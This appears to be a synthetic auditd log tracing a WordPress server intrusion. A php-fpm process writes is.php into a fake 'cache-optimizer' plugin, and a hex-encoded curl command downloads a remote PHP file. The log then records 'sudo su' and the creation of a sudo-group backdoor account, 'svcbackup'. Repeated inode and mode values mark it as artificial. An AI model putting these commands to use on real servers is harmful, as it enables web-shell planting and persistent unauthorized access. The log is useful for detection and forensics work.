type=SYSCALL msg=audit(1789367152.410:4101): arch=c000003e syscall=59 success=yes exit=0 a0=5ff502032258 a1=5ff502025620 a2=5ff502036dd0 a3=0 items=2 ppid=3838 pid=3839 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=5 comm="tail" exe="/usr/bin/tail" subj=unconfined key="exec"ARCH=x86_64 SYSCALL=execve AUID="1000" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=EXECVE msg=audit(1789367152.410:4101): argc=4 a0="tail" a1="-n" a2="50" a3="/var/log/auth.log"
type=CWD msg=audit(1789367152.410:4101): cwd="/home/ubuntu"
type=PATH msg=audit(1789367152.410:4101): item=0 name="/usr/bin/tail" inode=22074 dev=103:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789367152.410:4101): proctitle=7461696C002D6E003530002F7661722F6C6F672F617574682E6C6F67
type=SYSCALL msg=audit(1789429510.122:5401): arch=c000003e syscall=257 success=yes exit=0 a0=5ff502032258 a1=5ff502025620 a2=5ff502036dd0 a3=0 items=2 ppid=1000 pid=1200 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="php-fpm8.1" exe="/usr/sbin/php-fpm8.1" subj=unconfined key="webroot"ARCH=x86_64 SYSCALL=openat AUID="unset" UID="www-data" GID="www-data" EUID="www-data" SUID="www-data" FSUID="www-data" EGID="www-data" SGID="www-data" FSGID="www-data"
type=CWD msg=audit(1789429510.122:5401): cwd="/"
type=PATH msg=audit(1789429510.122:5401): item=0 name="/var/www/html/wp-content/plugins/cache-optimizer-a5d5" inode=22074 dev=103:01 mode=0100755 ouid=33 ogid=33 rdev=00:00 nametype=PARENT cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="www-data" OGID="www-data"
type=PATH msg=audit(1789429510.122:5401): item=1 name="/var/www/html/wp-content/plugins/cache-optimizer-a5d5/is.php" inode=22074 dev=103:01 mode=0100755 ouid=33 ogid=33 rdev=00:00 nametype=CREATE cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="www-data" OGID="www-data"
type=PROCTITLE msg=audit(1789429510.122:5401): proctitle=7068702D66706D3A00706F6F6C00777777
type=SYSCALL msg=audit(1789429512.300:5402): arch=c000003e syscall=59 success=yes exit=0 a0=5ff502032258 a1=5ff502025620 a2=5ff502036dd0 a3=0 items=2 ppid=1200 pid=5310 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/dash" subj=unconfined key="exec"ARCH=x86_64 SYSCALL=execve AUID="unset" UID="www-data" GID="www-data" EUID="www-data" SUID="www-data" FSUID="www-data" EGID="www-data" SGID="www-data" FSGID="www-data"
type=EXECVE msg=audit(1789429512.300:5402): argc=3 a0="sh" a1="-c" a2=6375726C202D732068747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6578616D706C652F7265706F2F6D61696E2F3132332E706870202D6F2069732E706870
type=CWD msg=audit(1789429512.300:5402): cwd="/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
type=PATH msg=audit(1789429512.300:5402): item=0 name="/usr/bin/dash" inode=22074 dev=103:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789429512.300:5402): proctitle=7368002D63006375726C202D732068747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6578616D706C652F7265706F2F6D61696E2F3132332E706870202D6F2069732E706870
type=SYSCALL msg=audit(1789429770.700:5403): arch=c000003e syscall=59 success=yes exit=0 a0=5ff502032258 a1=5ff502025620 a2=5ff502036dd0 a3=0 items=2 ppid=1200 pid=5320 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="exec"ARCH=x86_64 SYSCALL=execve AUID="unset" UID="www-data" GID="www-data" EUID="www-data" SUID="www-data" FSUID="www-data" EGID="www-data" SGID="www-data" FSGID="www-data"
type=EXECVE msg=audit(1789429770.700:5403): argc=2 a0="sudo" a1="su"
type=CWD msg=audit(1789429770.700:5403): cwd="/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
type=PATH msg=audit(1789429770.700:5403): item=0 name="/usr/bin/sudo" inode=22074 dev=103:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789429770.700:5403): proctitle=7375646F007375
type=SYSCALL msg=audit(1789429802.015:5404): arch=c000003e syscall=59 success=yes exit=0 a0=5ff502032258 a1=5ff502025620 a2=5ff502036dd0 a3=0 items=2 ppid=5320 pid=5501 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="useradd" exe="/usr/sbin/useradd" subj=unconfined key="exec"ARCH=x86_64 SYSCALL=execve AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=EXECVE msg=audit(1789429802.015:5404): argc=5 a0="useradd" a1="-m" a2="-G" a3="sudo" a4="svcbackup"
type=CWD msg=audit(1789429802.015:5404): cwd="/root"
type=PATH msg=audit(1789429802.015:5404): item=0 name="/usr/sbin/useradd" inode=22074 dev=103:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789429802.015:5404): proctitle=75736572616464002D6D002D47007375646F007376636261636B7570
type=SYSCALL msg=audit(1789430100.005:5405): arch=c000003e syscall=257 success=yes exit=0 a0=5ff502032258 a1=5ff502025620 a2=5ff502036dd0 a3=0 items=1 ppid=1 pid=6000 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="cron" exe="/usr/sbin/cron" subj=unconfined key="sensitive"ARCH=x86_64 SYSCALL=openat AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=CWD msg=audit(1789430100.005:5405): cwd="/"
type=PATH msg=audit(1789430100.005:5405): item=0 name="/etc/passwd" inode=22074 dev=103:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789430100.005:5405): proctitle=2F7573722F7362696E2F63726F6E002D66002D50
